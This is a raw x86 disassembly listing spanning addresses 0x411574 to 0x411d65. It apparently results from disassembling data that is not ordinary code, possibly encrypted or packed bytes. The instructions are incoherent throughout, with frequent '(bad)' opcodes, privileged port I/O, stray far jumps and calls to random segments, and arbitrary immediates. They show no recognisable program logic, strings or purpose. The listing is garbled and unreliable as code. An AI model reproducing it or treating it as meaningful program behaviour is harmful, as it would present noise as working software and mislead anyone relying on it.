  411574:	dec    esi
  411575:	bound  ebp,QWORD PTR [edi-0x5b5b92f5]
  41157b:	sub    al,BYTE PTR [edi+0xd94852f]
  411581:	shl    BYTE PTR [ebp-0x4d1ad7e4],0xe8
  411588:	push   ebp
  411589:	sbb    eax,0x26579dfc
  41158e:	xor    dl,al
  411590:	push   ss
  411591:	jnp    0x411578
  411593:	imul   eax,DWORD PTR [ebp+0x66f3f94],0x85a6c6ea
  41159d:	push   ebx
  41159e:	mov    WORD PTR [edi+0x49],ss
  4115a1:	rol    BYTE PTR [eax-0x23e31d81],0xb7
  4115a8:	in     al,dx
  4115a9:	sub    ebx,DWORD PTR [eax+0x64]
  4115ac:	js     0x41157a
  4115ae:	jmp    0xa7ad29b2
  4115b3:	fwait
  4115b4:	in     al,0xed
  4115b6:	pop    ds
  4115b7:	lea    ebp,[edi-0x7f]
  4115ba:	mov    bl,0x7d
  4115bc:	xor    bh,bh
  4115be:	pusha  
  4115bf:	aaa    
  4115c0:	lea    ebp,[eax-0x4e]
  4115c3:	scas   al,BYTE PTR es:[edi]
  4115c4:	adc    DWORD PTR [edi+ebx*8-0x487e8f77],esi
  4115cb:	and    edx,DWORD PTR [eax-0x18feaab3]
  4115d1:	xchg   edi,eax
  4115d2:	xchg   esp,eax
  4115d3:	pop    ebx
  4115d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115d5:	jno    0x41159a
  4115d7:	mov    ecx,0xf7cf1e12
  4115dc:	sub    al,0x87
  4115de:	fstp   QWORD PTR [edi-0x1ee9859f]
  4115e4:	cs mov dl,0xb2
  4115e7:	out    dx,eax
  4115e8:	adc    al,0x9c
  4115ea:	adc    al,0x16
  4115ec:	out    dx,eax
  4115ed:	ret    
  4115ee:	outs   dx,DWORD PTR ds:[esi]
  4115ef:	mov    ?,WORD PTR [esi+0x189e285d]
  4115f5:	sbb    ebp,0x39
  4115f8:	xlat   BYTE PTR ds:[ebx]
  4115f9:	adc    BYTE PTR [edx+esi*2+0x7],ah
  4115fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115ff:	dec    esi
  411600:	jp     0x4115b2
  411602:	xlat   BYTE PTR ds:[ebx]
  411603:	mov    esi,0x2761f250
  411608:	pop    esp
  411609:	pop    ebx
  41160a:	push   cs
  41160b:	mov    eax,ds:0x4369e469
  411610:	pop    ss
  411611:	fsubr  QWORD PTR [esi]
  411613:	push   es
  411614:	cs loopne 0x41168e
  411617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411618:	pop    es
  411619:	jae    0x4115d3
  41161b:	jo     0x4115a7
  41161d:	icebp  
  41161e:	out    dx,al
  41161f:	lock data16 sar BYTE PTR [edx+0x3a492131],1
  411627:	adc    eax,0x6f8e3009
  41162c:	out    dx,al
  41162d:	pushf  
  41162e:	aam    0xee
  411630:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411631:	bound  edi,QWORD PTR [ebp-0x483a7d31]
  411637:	cmp    al,0x98
  411639:	and    DWORD PTR [ebp+0x239c3f5c],eax
  41163f:	xchg   ebx,eax
  411640:	dec    esp
  411641:	or     al,0xb8
  411643:	sbb    eax,0xff9c2773
  411648:	ins    BYTE PTR es:[edi],dx
  411649:	cld    
  41164a:	xchg   edi,eax
  41164b:	scas   al,BYTE PTR es:[edi]
  41164c:	add    eax,0xff7be0a4
  411651:	cmp    esi,edi
  411653:	adc    BYTE PTR [edi-0x53f58e96],0x9
  41165a:	nop
  41165b:	rcl    DWORD PTR [esi+0x5b67b557],cl
  411661:	mov    esi,0xfb07ce3f
  411666:	fwait
  411667:	mov    ds:0x2c1dbeeb,eax
  41166c:	mov    ds:0xce0722c3,al
  411671:	clc    
  411672:	sub    BYTE PTR [ebx+eax*1-0x7b],ch
  411676:	sub    BYTE PTR ds:0x215edb3a,bl
  41167c:	adc    al,0xa8
  41167e:	scas   ax,WORD PTR es:[edi]
  411680:	pop    ss
  411681:	cmp    eax,0x158f04d7
  411686:	adc    BYTE PTR es:[edi-0x11],dh
  41168a:	cmc    
  41168b:	mov    ds:0xf2506384,eax
  411690:	scas   al,BYTE PTR es:[edi]
  411691:	or     al,0x1
  411693:	stos   DWORD PTR es:[edi],eax
  411694:	inc    ebx
  411695:	jl     0x411634
  411697:	xchg   eax,ebp
  411699:	dec    eax
  41169a:	(bad)  
  41169b:	jge    0x411655
  41169d:	arpl   WORD PTR ds:0x9a35,bx
  4116a2:	xor    BYTE PTR [bp-0x577d],0xe7
  4116a8:	jae    0x41169a
  4116aa:	add    BYTE PTR [ebp+0x633f170b],0xbe
  4116b1:	loope  0x4116ef
  4116b3:	jae    0x411663
  4116b5:	aad    0x17
  4116b7:	aas    
  4116b8:	sar    ch,0xea
  4116bb:	or     al,0xac
  4116bd:	(bad)  
  4116be:	xchg   ebx,eax
  4116bf:	add    eax,0x171624f
  4116c4:	mov    eax,ds:0xeaf34654
  4116c9:	cmc    
  4116ca:	das    
  4116cb:	pusha  
  4116cc:	xor    ah,BYTE PTR [ebx-0x3e5e8923]
  4116d2:	je     0x41166d
  4116d4:	dec    bh
  4116d6:	inc    edx
  4116d7:	das    
  4116d8:	sub    edi,DWORD PTR [esi-0x6dfbcb1e]
  4116de:	inc    esi
  4116df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116e0:	pop    es
  4116e1:	leave  
  4116e2:	ret    
  4116e3:	(bad)  
  4116e4:	lock ja 0x411726
  4116e7:	sbb    ebp,DWORD PTR [ecx-0x30da9492]
  4116ed:	hlt    
  4116ee:	test   eax,0x2111d189
  4116f3:	aad    0xab
  4116f5:	push   esi
  4116f6:	push   edx
  4116f7:	add    ecx,DWORD PTR [ecx]
  4116f9:	scas   al,BYTE PTR es:[edi]
  4116fa:	adc    al,0x55
  4116fc:	mov    ds:0xab8d85b3,al
  411701:	cwde   
  411702:	mov    esi,0x2f0f53ee
  411707:	sub    DWORD PTR [edi-0x2b824a8c],ecx
  41170d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41170e:	and    DWORD PTR [eax-0x7ca1a1a0],eax
  411714:	push   eax
  411715:	loope  0x4116dc
  411717:	cmc    
  411718:	call   0x5550:0x4ca290a9
  41171f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411720:	add    ebp,DWORD PTR [ebp-0x51ed2ab4]
  411726:	mov    eax,0x3cc66d1d
  41172b:	inc    ebp
  41172c:	mov    al,ds:0x796d8a66
  411731:	and    ebp,DWORD PTR [ecx]
  411733:	mov    eax,0xce969eab
  411738:	jnp    0x41178c
  41173a:	inc    eax
  41173b:	xchg   ebx,eax
  41173c:	sbb    DWORD PTR ds:0xc1a76aa6,0x3b
  411743:	mov    ds:0xe5a17ddc,eax
  411748:	push   edi
  411749:	xchg   ecx,eax
  41174a:	ins    DWORD PTR es:[edi],dx
  41174b:	and    DWORD PTR [edi],ebx
  41174d:	jmp    0x192a:0x38913f25
  411754:	(bad)  
  411755:	jmp    0x96a1:0x9ad5c3ed
  41175c:	pop    ebp
  41175d:	stc    
  41175e:	adc    dh,al
  411760:	sbb    eax,0xdb2648ab
  411765:	lock xchg ah,ch
  411768:	lock pop edx
  41176a:	addr16 loopne 0x4117da
  41176d:	cmp    DWORD PTR [eax],esp
  41176f:	imul   ebp,ecx,0x22b08d86
  411775:	add    edi,DWORD PTR [eax-0x43e718d9]
  41177b:	sub    ebp,DWORD PTR [ecx+0x2dec7766]
  411781:	pop    ss
  411782:	mov    DWORD PTR ss:[esp+edi*2+0x228446a7],ebx
  41178a:	pusha  
  41178b:	(bad)  
  41178c:	imul   edx,DWORD PTR [eax-0x48a60f42],0xffffff9c
  411793:	sbb    eax,0x33e7224f
  411798:	jbe    0x4117a3
  41179a:	dec    ebp
  41179b:	leave  
  41179c:	lods   eax,DWORD PTR ds:[esi]
  41179d:	int    0xd2
  41179f:	pushf  
  4117a0:	push   edi
  4117a1:	or     eax,0x913624d8
  4117a6:	mov    BYTE PTR [edx],al
  4117a8:	fwait
  4117a9:	js     0x4117df
  4117ab:	xor    al,0x9d
  4117ad:	push   cs
  4117ae:	add    eax,0x4342555d
  4117b3:	scas   eax,DWORD PTR es:[edi]
  4117b4:	aad    0xb1
  4117b6:	loopne 0x41179b
  4117b8:	jge    0x4117d8
  4117ba:	mov    BYTE PTR ds:0x2d40aa3c,dh
  4117c0:	test   eax,0x6cdc8ced
  4117c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117c6:	xor    bh,ah
  4117c8:	push   cs
  4117c9:	push   ecx
  4117ca:	rcl    BYTE PTR [edi-0x5cafe88f],0xbd
  4117d1:	adc    eax,0x23684d94
  4117d6:	leave  
  4117d7:	cmc    
  4117d8:	(bad)  
  4117d9:	jnp    0x4117ab
  4117db:	mov    bl,0xf0
  4117dd:	jne    0x411803
  4117df:	ret    
  4117e0:	into   
  4117e1:	xchg   ebx,eax
  4117e2:	jmp    0x41178c
  4117e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117e5:	jnp    0x41177f
  4117e7:	and    eax,0x14b12c26
  4117ec:	inc    edi
  4117ed:	mov    ah,0x3e
  4117ef:	adc    BYTE PTR [ebx+ebx*1],dl
  4117f2:	icebp  
  4117f3:	and    DWORD PTR [edi+eax*2],edi
  4117f6:	scas   al,BYTE PTR es:[edi]
  4117f7:	test   eax,0x680187db
  4117fc:	sub    bh,dh
  4117fe:	cmp    DWORD PTR [ebx+0x997cd55],0xe17679
  411808:	mul    BYTE PTR [ecx+esi*8+0x49968bda]
  41180f:	into   
  411810:	mov    WORD PTR [ebp-0xa],es
  411813:	adc    edi,DWORD PTR [ebp+0xf84c51d]
  411819:	push   edx
  41181a:	enter  0x164c,0x8c
  41181e:	and    ebp,esi
  411820:	ret    
  411821:	pusha  
  411822:	loopne 0x411833
  411824:	rol    BYTE PTR [esi],0xea
  411827:	dec    esp
  411828:	jge    0x41189d
  41182a:	ret    
  41182b:	out    dx,al
  41182c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41182d:	test   DWORD PTR [ebp+0x2b],esp
  411830:	inc    edx
  411831:	(bad)  
  411832:	rcl    DWORD PTR [ebp-0x5d3fd99a],1
  411838:	(bad)  
  411839:	imul   ecx,DWORD PTR [esi+0x26],0xffffffe1
  41183d:	mov    dh,BYTE PTR ds:0x63b5f9c0
  411843:	sti    
  411844:	out    0xf9,eax
  411846:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411847:	xchg   BYTE PTR [edx+esi*8],al
  41184a:	add    ch,dl
  41184c:	jmp    0x483be2a3
  411851:	test   eax,0xa9ff1ce6
  411856:	in     eax,0xed
  411858:	add    al,0x94
  41185a:	daa    
  41185b:	stos   DWORD PTR es:[edi],eax
  41185c:	xor    BYTE PTR [ebp-0xf],dl
  41185f:	loope  0x41188c
  411861:	(bad)  
  411863:	addr16 fucomip st,st(5)
  411866:	inc    ecx
  411867:	dec    ebp
  411868:	mov    eax,ds:0xdc812e8a
  41186d:	jge    0x4118cf
  41186f:	jle    0x411899
  411871:	cld    
  411872:	in     al,dx
  411873:	inc    ebp
  411874:	ret    0xdcb0
  411877:	imul   esi,DWORD PTR [eax+0xb],0xca7c8399
  41187e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41187f:	out    dx,eax
  411880:	(bad)  
  411881:	fnstsw WORD PTR [ecx]
  411883:	leave  
  411884:	jne    0x411834
  411886:	xchg   edi,eax
  411887:	dec    ecx
  411888:	ja     0x41181d
  41188a:	in     al,0xfa
  41188c:	adc    cl,ah
  41188e:	loope  0x4118c1
  411890:	jecxz  0x411841
  411892:	ja     0x4118fd
  411894:	loopne 0x411915
  411896:	ror    DWORD PTR [edx],0xf8
  411899:	sbb    dh,BYTE PTR [edx-0x252dd1b4]
  41189f:	inc    ebx
  4118a0:	adc    esp,DWORD PTR [edx]
  4118a2:	sub    bh,BYTE PTR [esi+0x2331e7ac]
  4118a8:	nop
  4118a9:	into   
  4118aa:	cs aas 
  4118ac:	or     esi,0xffffffe0
  4118af:	inc    eax
  4118b0:	in     al,0x17
  4118b2:	add    ebx,eax
  4118b4:	mov    ds:0x63d30b5b,al
  4118b9:	mov    ds:0x60ebb1a6,eax
  4118be:	inc    ebp
  4118bf:	inc    ebp
  4118c0:	(bad)  
  4118c1:	mov    ecx,0x281cf00d
  4118c6:	jmp    0x7ca2:0x813482e7
  4118cd:	fs leave 
  4118cf:	into   
  4118d0:	and    BYTE PTR [eax+0x28],dl
  4118d3:	mov    esp,DWORD PTR [eax+0x517a478b]
  4118d9:	es push cs
  4118db:	jge    0x411918
  4118dd:	pop    ebx
  4118de:	cmp    ebp,DWORD PTR [edi-0x5]
  4118e1:	xchg   DWORD PTR [di-0x4107],edx
  4118e6:	jle    0x411935
  4118e8:	nop
  4118e9:	data16 mov dh,0xe2
  4118ec:	data16 (bad) 
  4118ee:	or     al,0xb2
  4118f0:	and    BYTE PTR [ebx+0x9],ah
  4118f3:	cmp    ebx,0x382ce3d2
  4118f9:	or     edx,eax
  4118fb:	mov    bl,0x9d
  4118fd:	push   eax
  4118fe:	add    ah,ah
  411900:	xchg   edi,eax
  411901:	(bad)  
  411903:	pop    eax
  411904:	cli    
  411905:	sbb    eax,0xe60fdaa9
  41190a:	outs   dx,BYTE PTR ds:[esi]
  41190b:	jae    0x4118f9
  41190d:	push   cs
  41190e:	mov    ebx,0xca158636
  411913:	fsub   DWORD PTR [eax+edi*1-0x516508d6]
  41191a:	sahf   
  41191b:	dec    edx
  41191c:	mov    ah,0xd6
  41191e:	iret   
  41191f:	push   0x80e92b26
  411924:	pop    es
  411925:	out    dx,al
  411926:	(bad)  
  411927:	cmp    al,0xc7
  411929:	mov    al,0x9a
  41192b:	fsub   DWORD PTR [ecx+0x63]
  41192e:	jmp    0x24448b7b
  411933:	cmp    esp,ebp
  411935:	xor    esi,DWORD PTR [ebp+0x64]
  411938:	pop    es
  411939:	pop    esi
  41193a:	pop    edi
  41193b:	aad    0x75
  41193d:	shl    BYTE PTR [ebp-0x62],1
  411940:	lds    ecx,FWORD PTR [edx-0x5d]
  411943:	(bad)  [eax]
  411945:	fmulp  st(4),st
  411947:	fwait
  411948:	push   ds
  411949:	mov    esp,0x50f79cdd
  41194e:	fdiv   QWORD PTR [edx+0x2d]
  411951:	jmp    0xe04d035d
  411956:	pop    ecx
  411957:	leave  
  411958:	sahf   
  411959:	add    eax,DWORD PTR [edi-0x7c0d6497]
  41195f:	(bad)  
  411960:	cs or  eax,ebx
  411963:	in     eax,0x46
  411965:	repnz call 0x5e7f:0x36251555
  41196d:	mov    ah,BYTE PTR [edx+ecx*4-0x6c]
  411971:	mov    ebp,0xec495288
  411976:	je     0x41194f
  411978:	cmp    ecx,DWORD PTR [esi-0x45]
  41197b:	xchg   ebp,eax
  41197c:	add    edx,DWORD PTR ds:0x73bae7cb
  411982:	add    al,0x90
  411984:	imul   BYTE PTR [ecx+0x42]
  411987:	jle    0x41194d
  411989:	pop    ss
  41198a:	jno    0x4119bd
  41198c:	push   esi
  41198d:	aas    
  41198e:	or     DWORD PTR [ebp+0x18e6a857],ebx
  411994:	aas    
  411995:	jmp    0x411996
  411997:	add    ecx,DWORD PTR [ebp-0x60]
  41199a:	inc    edx
  41199b:	pop    ds
  41199c:	mov    eax,0x147820a2
  4119a1:	fistp  DWORD PTR [edx+ebx*8-0x4f9500de]
  4119a8:	sti    
  4119a9:	or     DWORD PTR [ecx],esp
  4119ab:	daa    
  4119ac:	or     DWORD PTR [ebp-0x1c],0xfffffff9
  4119b0:	in     eax,0x5f
  4119b2:	stos   BYTE PTR es:[edi],al
  4119b3:	xor    al,0xf8
  4119b5:	ds jmp 0x4119da
  4119b8:	fld    st(7)
  4119ba:	ins    BYTE PTR es:[edi],dx
  4119bb:	pop    esi
  4119bc:	lods   eax,DWORD PTR ds:[esi]
  4119bd:	push   edx
  4119be:	shl    BYTE PTR [esi-0x18d77004],cl
  4119c4:	imul   ecx,DWORD PTR [ebx+0x33],0x58bd69f4
  4119cb:	stos   BYTE PTR es:[edi],al
  4119cc:	mov    ecx,0x5604be07
  4119d1:	fisttp QWORD PTR [ecx-0x9a838c3]
  4119d7:	sahf   
  4119d8:	dec    ebp
  4119d9:	fxch   st(7)
  4119db:	dec    ebx
  4119dc:	cmp    eax,0x73bfe767
  4119e1:	in     al,dx
  4119e2:	or     BYTE PTR [ecx-0x51],dl
  4119e5:	or     DWORD PTR [ebp+0x7b99758d],edx
  4119eb:	enter  0x7dc7,0xd2
  4119ef:	test   BYTE PTR [ebx+0xc59ca8],0xd0
  4119f6:	inc    edi
  4119f7:	mov    cl,0xa
  4119f9:	dec    esp
  4119fa:	popf   
  4119fb:	sbb    eax,0xa1ac6cb8
  411a00:	adc    eax,0x5917ea8c
  411a05:	pop    esp
  411a06:	jecxz  0x411a51
  411a08:	jo     0x411a05
  411a0a:	pop    esp
  411a0b:	add    BYTE PTR [edx+0x520ba85d],al
  411a11:	or     al,bl
  411a13:	adc    bl,BYTE PTR ds:0x354a9473
  411a19:	xchg   ecx,eax
  411a1a:	clc    
  411a1b:	fld1   
  411a1d:	cmp    al,0x4f
  411a1f:	push   ss
  411a20:	or     ah,BYTE PTR [edx-0x6a670cee]
  411a26:	mov    ah,0x49
  411a28:	fimul  DWORD PTR [edi]
  411a2a:	sub    al,0xe
  411a2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a2d:	inc    esp
  411a2e:	stos   DWORD PTR es:[edi],eax
  411a2f:	push   eax
  411a30:	mov    esp,0x11304f6a
  411a35:	outs   dx,BYTE PTR ds:[esi]
  411a36:	cwde   
  411a37:	lahf   
  411a38:	(bad)  
  411a39:	loopne 0x411aba
  411a3b:	cdq    
  411a3c:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  411a3e:	leave  
  411a3f:	cmp    esi,DWORD PTR [eax-0x3fc7bb18]
  411a45:	ds mov eax,0x72b0048e
  411a4b:	stos   BYTE PTR es:[edi],al
  411a4c:	push   ebp
  411a4d:	fbstp  TBYTE PTR [edi]
  411a4f:	stos   DWORD PTR es:[edi],eax
  411a50:	imul   edx,DWORD PTR [edi-0x25],0x24b314f4
  411a57:	xor    ah,BYTE PTR [edx-0x28]
  411a5a:	cmp    al,0xe3
  411a5c:	aam    0xa5
  411a5e:	push   esp
  411a5f:	cmp    BYTE PTR [esi+0x30e96560],dl
  411a65:	and    BYTE PTR [esi],0x4b
  411a68:	ret    0xeab8
  411a6b:	ret    0x2cf
  411a6e:	pop    ebx
  411a6f:	or     ah,dl
  411a71:	ss cmp al,0x30
  411a74:	das    
  411a75:	hlt    
  411a76:	sahf   
  411a77:	cmp    eax,0x817a558d
  411a7c:	xchg   BYTE PTR [edx-0x7d52c2c3],bh
  411a82:	mov    BYTE PTR [ebx],ch
  411a84:	add    DWORD PTR [edi],edx
  411a86:	jl     0x411a72
  411a88:	out    dx,eax
  411a89:	add    al,0xc9
  411a8b:	nop
  411a8c:	stc    
  411a8d:	stc    
  411a8e:	cli    
  411a8f:	daa    
  411a90:	adc    ah,BYTE PTR [eax+eax*4-0x2cc96c96]
  411a97:	out    0x30,al
  411a99:	sbb    edi,ebp
  411a9b:	mov    DWORD PTR [ebp+0x56],esi
  411a9e:	mov    BYTE PTR [esi+0x2d],ch
  411aa1:	xlat   BYTE PTR ds:[ebx]
  411aa2:	push   cs
  411aa3:	xor    DWORD PTR [esi],esp
  411aa5:	ds dec esi
  411aa7:	dec    esp
  411aa8:	xchg   esi,eax
  411aa9:	das    
  411aaa:	js     0x411a7d
  411aac:	lds    ebx,FWORD PTR [ebx]
  411aae:	push   eax
  411aaf:	add    DWORD PTR [ecx+ebx*2+0x32510485],edi
  411ab6:	inc    ecx
  411ab7:	adc    dh,al
  411ab9:	outs   dx,DWORD PTR ds:[esi]
  411aba:	retf   0xa100
  411abd:	pop    eax
  411abe:	inc    ebp
  411abf:	popf   
  411ac0:	jb     0x411b01
  411ac2:	jmp    0xe95a:0xf284924
  411ac9:	and    al,BYTE PTR [ecx+0x47c4a72]
  411acf:	hlt    
  411ad0:	enter  0x3f82,0xfb
  411ad4:	mov    ebx,0x1659118
  411ad9:	std    
  411ada:	jae    0x411a91
  411adc:	scas   al,BYTE PTR es:[edi]
  411add:	ret    
  411ade:	cmp    BYTE PTR [edx+0x4d412457],bh
  411ae4:	out    dx,al
  411ae5:	adc    al,0x35
  411ae7:	or     BYTE PTR [ebx+0x31],al
  411aea:	lods   eax,DWORD PTR ds:[esi]
  411aeb:	aas    
  411aec:	aas    
  411aed:	add    BYTE PTR [edi-0x13],dl
  411af0:	in     al,dx
  411af1:	clc    
  411af2:	test   al,0xae
  411af4:	inc    ebx
  411af5:	(bad)  
  411af6:	cld    
  411af7:	sub    dh,al
  411af9:	daa    
  411afa:	hlt    
  411afb:	pop    ebx
  411afc:	xchg   ecx,eax
  411afd:	push   es
  411afe:	dec    edi
  411aff:	scas   eax,DWORD PTR es:[edi]
  411b00:	jg     0x411ab5
  411b02:	iret   
  411b03:	pop    esp
  411b04:	lahf   
  411b05:	dec    ebp
  411b06:	adc    eax,0xb67c99c2
  411b0b:	ins    DWORD PTR es:[edi],dx
  411b0c:	mov    ch,0xb4
  411b0e:	add    bh,BYTE PTR [eax]
  411b10:	mov    ebx,0x9f47b5d0
  411b15:	lock mov cl,0x42
  411b18:	ror    ah,cl
  411b1a:	jmp    0x411b58
  411b1c:	test   eax,0xd2d80f33
  411b21:	adc    al,0x49
  411b23:	jp     0x411b66
  411b25:	mov    esp,0x678d551c
  411b2a:	clc    
  411b2b:	loopne 0x411b55
  411b2d:	in     al,dx
  411b2e:	or     eax,0x5e83eb79
  411b33:	cmp    BYTE PTR [ebx],0x1b
  411b36:	ret    0xc3cf
  411b39:	jne    0x411b92
  411b3b:	mov    fs,esp
  411b3d:	cmp    DWORD PTR [edx],edi
  411b3f:	ror    DWORD PTR [ecx+0x3b8ca95e],cl
  411b45:	sti    
  411b46:	xor    DWORD PTR [eax+0x7dabf2db],esp
  411b4c:	and    al,0x17
  411b4e:	push   es
  411b4f:	scas   al,BYTE PTR es:[edi]
  411b50:	jns    0x411b3b
  411b52:	and    al,0x80
  411b54:	gs das 
  411b56:	sub    eax,0x84880850
  411b5b:	arpl   WORD PTR [esi+0x28],ax
  411b5e:	in     al,dx
  411b5f:	lds    ecx,FWORD PTR [ebp-0x4a]
  411b62:	and    al,0x19
  411b64:	out    0x5c,eax
  411b66:	pop    esi
  411b67:	xlat   BYTE PTR ds:[ebx]
  411b68:	sbb    ebx,DWORD PTR [edx+0xc3eccd5]
  411b6e:	popa   
  411b6f:	sahf   
  411b70:	rcl    BYTE PTR [edx+0x4c],cl
  411b73:	jmp    0xa6b4:0x3e3c2b14
  411b7a:	jo     0x411b96
  411b7c:	shr    BYTE PTR [edx],0x5c
  411b7f:	jp     0x411b75
  411b81:	test   edx,0xfa10f6bb
  411b87:	loopne 0x411b91
  411b89:	add    dh,BYTE PTR [edx+0x1c0c4cee]
  411b8f:	cmp    BYTE PTR [esi-0x4cdfcc4b],ah
  411b95:	pop    ss
  411b96:	sar    edx,cl
  411b98:	loope  0x411b89
  411b9a:	cmp    DWORD PTR ds:0x6daaf58e,esp
  411ba0:	mov    esi,0x96d75b2e
  411ba5:	mov    edx,DWORD PTR [edx+0x25581f95]
  411bab:	mov    ah,0x5
  411bad:	fisubr WORD PTR [edi+0x8]
  411bb0:	xor    eax,0x9cb12fea
  411bb5:	ss dec eax
  411bb7:	cmp    bh,BYTE PTR [eax+0x3d018567]
  411bbd:	popa   
  411bbe:	jl     0x411c3e
  411bc0:	out    0x1a,eax
  411bc2:	or     al,0xda
  411bc4:	cwde   
  411bc5:	mov    WORD PTR [eax+0x7bc04dd6],ds
  411bcb:	mov    ebx,0x3994e709
  411bd0:	aam    0xa9
  411bd2:	sub    dh,ch
  411bd4:	cdq    
  411bd5:	test   al,0x8e
  411bd7:	ud0    ebp,DWORD PTR [edx+0x182bc2db]
  411bde:	mov    ecx,0x99874553
  411be3:	imul   edx,DWORD PTR [ecx+ebp*1-0x30],0x4105e05d
  411beb:	and    dh,BYTE PTR [ecx+0x5c685cd4]
  411bf1:	pop    ecx
  411bf2:	stos   BYTE PTR es:[edi],al
  411bf3:	imul   eax,DWORD PTR [eax+0x75459e36],0x63
  411bfa:	mov    esp,cr3
  411bfd:	(bad)  
  411bfe:	or     al,0xb3
  411c00:	dec    esp
  411c01:	jnp    0x411c5c
  411c03:	add    al,0xf2
  411c05:	adc    ah,dl
  411c07:	fld    TBYTE PTR [eax]
  411c09:	cmp    cl,BYTE PTR [edi]
  411c0b:	lods   al,BYTE PTR ds:[esi]
  411c0c:	outs   dx,DWORD PTR ds:[esi]
  411c0d:	push   ebp
  411c0e:	dec    esp
  411c0f:	jno    0x411bab
  411c11:	mov    ebp,0x66e13bfd
  411c16:	inc    ecx
  411c17:	inc    esi
  411c18:	mov    ah,0x7d
  411c1a:	jmp    0x99d8:0x59a332c6
  411c21:	rcr    BYTE PTR [esi+0x4e],cl
  411c24:	hlt    
  411c25:	inc    ecx
  411c26:	ins    DWORD PTR es:[edi],dx
  411c27:	sbb    DWORD PTR [ecx+0x6133b4ed],esp
  411c2d:	cli    
  411c2e:	gs imul esi,esi,0x40
  411c32:	and    DWORD PTR [edi+0x26399403],esp
  411c38:	sub    DWORD PTR [esi+0x544d374e],esi
  411c3e:	mov    eax,ds:0x72b102f4
  411c43:	jp     0x411c89
  411c45:	adc    ah,BYTE PTR [ebp-0x6a038cad]
  411c4b:	lea    esi,[ebx-0x37]
  411c4e:	or     eax,0x97b4bdf7
  411c53:	sub    al,0xdf
  411c55:	xor    esp,DWORD PTR [esi-0x7e]
  411c58:	jg     0x411c3b
  411c5a:	test   BYTE PTR [esp+edi*4],bh
  411c5d:	pop    eax
  411c5e:	call   0x16d0:0xc53797b2
  411c65:	not    DWORD PTR [ebx]
  411c67:	dec    ebx
  411c68:	mov    bl,0xfd
  411c6a:	in     al,0x9f
  411c6c:	pop    edi
  411c6d:	or     DWORD PTR [eax-0x4a60770b],0x87a841d4
  411c77:	sub    ch,BYTE PTR [esi+0x591af37e]
  411c7d:	jae    0x411c05
  411c7f:	scas   al,BYTE PTR es:[edi]
  411c80:	fwait
  411c81:	pop    ebp
  411c82:	call   0x7049:0x7821ff85
  411c89:	scas   al,BYTE PTR es:[edi]
  411c8a:	inc    edi
  411c8b:	and    BYTE PTR [edi+ecx*8-0x486b35a],0xdd
  411c93:	add    BYTE PTR [ebx-0x7a],0x63
  411c97:	sub    ebx,DWORD PTR [ecx-0xa56da5f]
  411c9d:	and    DWORD PTR [eax+0x1f885b18],ebp
  411ca3:	sub    al,0xaa
  411ca5:	js     0x411c3a
  411ca7:	xor    al,0xfc
  411ca9:	shr    DWORD PTR [eax+ebx*1-0x2a],0x92
  411cae:	out    0x3f,al
  411cb0:	or     esp,0xffffff9e
  411cb3:	push   ecx
  411cb4:	inc    ebp
  411cb5:	into   
  411cb6:	inc    eax
  411cb7:	ins    BYTE PTR es:[edi],dx
  411cb8:	adc    BYTE PTR [ebp+0x50d99ac2],0xe
  411cbf:	ss ret 
  411cc1:	pop    ds
  411cc2:	pop    ss
  411cc3:	test   eax,0xb951a55e
  411cc8:	dec    ecx
  411cc9:	push   cs
  411cca:	rcr    DWORD PTR [esi+ebp*1+0x73f99f4a],0xca
  411cd2:	inc    ebx
  411cd3:	das    
  411cd4:	loop   0x411c74
  411cd6:	push   ds
  411cd7:	mov    dh,0x24
  411cd9:	xor    eax,0x715c7cb7
  411cde:	test   al,0x16
  411ce0:	cwde   
  411ce1:	push   ss
  411ce2:	dec    eax
  411ce3:	repz jmp 0x411c73
  411ce6:	loope  0x411d49
  411ce8:	cwde   
  411ce9:	sbb    eax,0x4acb9f78
  411cee:	jp     0x411d3f
  411cf0:	bound  esp,QWORD PTR [esi]
  411cf2:	cmp    BYTE PTR [ecx],dl
  411cf4:	sbb    eax,0xfc501193
  411cf9:	test   ebp,esp
  411cfb:	imul   ebp,ecx,0x652890e2
  411d01:	idiv   BYTE PTR [ecx-0x72]
  411d04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d05:	inc    edx
  411d06:	add    dh,al
  411d08:	mov    es,WORD PTR [ecx]
  411d0a:	sub    edi,DWORD PTR [esi+ebx*4-0x74]
  411d0e:	mov    bh,BYTE PTR [edx+0x8acf0d7]
  411d14:	jns    0x411c9c
  411d16:	call   0x164a:0xe1c0d35f
  411d1d:	shl    esi,cl
  411d1f:	cmp    al,0x39
  411d21:	repnz cmp al,BYTE PTR [edx-0x760d3442]
  411d28:	gs cmc 
  411d2a:	adc    cl,BYTE PTR [edx]
  411d2c:	fwait
  411d2d:	sub    dl,BYTE PTR [esp+eax*1-0x6125fb30]
  411d34:	push   esp
  411d35:	(bad)  
  411d36:	add    esi,DWORD PTR [esp+ebp*8]
  411d39:	call   0x76ac38dd
  411d3e:	jg     0x411cfa
  411d40:	or     edx,DWORD PTR [eax+0x6d]
  411d43:	sbb    cl,BYTE PTR [ecx-0x36]
  411d46:	mov    ch,0xd4
  411d48:	dec    ebp
  411d49:	std    
  411d4a:	shr    DWORD PTR [ebp-0x47],0x8e
  411d4e:	push   esi
  411d4f:	scas   eax,DWORD PTR es:[edi]
  411d50:	popa   
  411d51:	xor    esi,edi
  411d53:	mov    DWORD PTR [ecx+0x59],0xb5e7b4a0
  411d5a:	jp     0x411d5e
  411d5c:	scas   eax,DWORD PTR es:[edi]
  411d5d:	in     al,0x12
  411d5f:	arpl   WORD PTR gs:[ebx],dx
  411d62:	and    al,0x8b
  411d64:	push   ss
  411d65:	cld    
